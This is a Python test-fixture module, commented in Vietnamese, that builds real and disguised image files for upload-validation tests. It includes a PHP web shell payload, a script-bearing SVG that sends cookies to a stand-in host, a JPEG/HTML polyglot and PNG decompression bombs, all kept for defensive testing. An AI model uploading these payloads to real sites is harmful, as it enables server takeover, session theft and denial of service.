"""Dựng file ảnh (và file GIẢ DẠNG ảnh) cho bộ đo Phase 5.

Tách khỏi `conftest.py` vì cùng lý do `_quan_tri.py` tách: đây là bộ dựng **dữ liệu tấn
công**, và nó chỉ có nghĩa với ba file test về ảnh. Nằm trong `conftest` thì nó là thứ
mọi bài đo của repo phải cuộn qua.

Tên file bắt đầu bằng `_` để `python_files = ["test_*.py"]` không thu nó vào làm module test.
"""

from __future__ import annotations

import io
import struct
import zlib

from PIL import Image
from PIL.ExifTags import IFD, Base as TheEXIF


def anh_byte(
    *,
    dinh_dang: str = "JPEG",
    kich_thuoc: tuple[int, int] = (120, 90),
    mau: str | tuple = "red",
    ngay_chup: str | None = None,
) -> bytes:
    """Một ảnh THẬT, hợp lệ. `ngay_chup` dạng EXIF `"YYYY:MM:DD HH:MM:SS"`.

    Ảnh nhiễu chứ không phẳng một màu khi cần kích thước file thật: JPEG của một ô màu
    đơn nén xuống vài trăm byte, nên "ảnh 8MB" không dựng được bằng một màu.
    """
    mode = "RGB" if dinh_dang in ("JPEG", "WEBP") else "RGBA"
    anh = Image.new(mode, kich_thuoc, mau)
    ra = io.BytesIO()
    tuy_chon: dict = {}
    if ngay_chup is not None:
        exif = Image.Exif()
        # Gán nguyên một dict vào con trỏ IFD — cách Pillow ghi nhánh EXIF lồng nhau.
        exif[IFD.Exif] = {TheEXIF.DateTimeOriginal: ngay_chup}
        tuy_chon["exif"] = exif
    anh.save(ra, format=dinh_dang, **tuy_chon)
    return ra.getvalue()


def anh_nhieu(kich_thuoc: tuple[int, int], *, dinh_dang: str = "JPEG") -> bytes:
    """Ảnh NHIỄU — không nén được, nên kích thước file tỉ lệ với số pixel.

    Cần cho bài đo "ảnh 8MB xử lý ≤5s" (A2): một tấm 8MB phải là 8MB thật, không phải
    một ô màu đơn được khai là to.
    """
    import os

    w, h = kich_thuoc
    tho = os.urandom(w * h * 3)
    anh = Image.frombytes("RGB", kich_thuoc, tho)
    ra = io.BytesIO()
    anh.save(ra, format=dinh_dang, quality=100, subsampling=0)
    return ra.getvalue()


def _chunk_png(kieu: bytes, du_lieu: bytes) -> bytes:
    return (
        struct.pack(">I", len(du_lieu))
        + kieu
        + du_lieu
        + struct.pack(">I", zlib.crc32(kieu + du_lieu) & 0xFFFFFFFF)
    )


def bom_png_khai_khong(w: int, h: int) -> bytes:
    """PNG vài chục byte **khai** `w × h` khổng lồ — bom giải nén cổ điển.

    Không có IDAT: mục đích của nó là làm thư viện ảnh cấp phát `w × h` pixel dựa trên
    HEADER. Một phép kiểm chạy sau `decode` không bao giờ được chạy tới với file này —
    tiến trình đã hết RAM trước đó. Đây là lý do phép kiểm 4 đọc từ header.
    """
    ihdr = struct.pack(">II", w, h) + bytes([8, 2, 0, 0, 0])  # 8-bit, truecolor
    return b"\x89PNG\r\n\x1a\n" + _chunk_png(b"IHDR", ihdr) + _chunk_png(b"IEND", b"")


def bom_png_that(canh: int) -> bytes:
    """PNG **hợp lệ hoàn toàn**, file nhỏ, giải nén ra `canh²` pixel.

    Khác `bom_png_khai_khong` ở chỗ nó qua được `verify()` — nên nó là bài đo cho phép
    kiểm 4 **của chúng ta** (`PIXEL_TOI_DA`), chứ không phải cho hàng rào sẵn có của
    Pillow. Một ô xám đặc nén xuống vài KB dù giải ra hàng chục triệu pixel.
    """
    ra = io.BytesIO()
    Image.new("L", (canh, canh), 128).save(ra, format="PNG", compress_level=9)
    return ra.getvalue()


#: Một file PHP đổi đuôi thành `.jpg`. Không có magic byte ảnh nào.
PHP_GIA_JPG = b"<?php system($_GET['c']); ?>\n" + b"A" * 200

#: Một trang HTML đổi đuôi thành `.jpg`.
HTML_GIA_JPG = b"<html><script>alert(document.cookie)</script></html>"

#: SVG — **là XML, chạy script khi trình duyệt mở trực tiếp**. Đây là lý do allowlist
#: không có nó, và lý do đó chỉ nguy hiểm vì Caddy phục vụ file cùng origin với phiên.
SVG_GIA_JPG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b"<script>fetch('https://ke-xau.example/'+document.cookie)</script></svg>"
)


def polyglot_jpeg_html() -> bytes:
    """JPEG hợp lệ **nối đuôi** một khối HTML — file đa định dạng.

    Trình duyệt nào sniff ra HTML (hoặc bất kỳ tầng nào phía sau đọc nhầm) sẽ chạy đoạn
    script. Phép kiểm nào chỉ nhìn phần ĐẦU file đều nói "đây là JPEG hợp lệ" — và nói
    đúng. Thứ vô hiệu hoá nó không phải một phép kiểm, mà là **tái mã hoá**: ảnh mới do
    Pillow ghi ra từ ma trận pixel, và trong ma trận pixel không có chỗ nào chứa đuôi HTML.
    """
    return anh_byte(dinh_dang="JPEG") + b"\n<script>alert(1)</script>\n"


def duoi_va_byte(du_lieu: bytes, ten: str = "anh.jpg", kieu: str = "image/jpeg"):
    """`(ten, BytesIO, content_type)` — đúng bộ ba `django.test.Client` cần cho multipart.

    Mặc định `ten`/`kieu` **nói dối** (`.jpg` / `image/jpeg`) cho mọi loại nội dung: đó
    là hình dạng thật của một request tấn công, và nó ghim rằng server không tin hai giá
    trị đó.
    """
    f = io.BytesIO(du_lieu)
    f.name = ten
    return (ten, f, kieu)
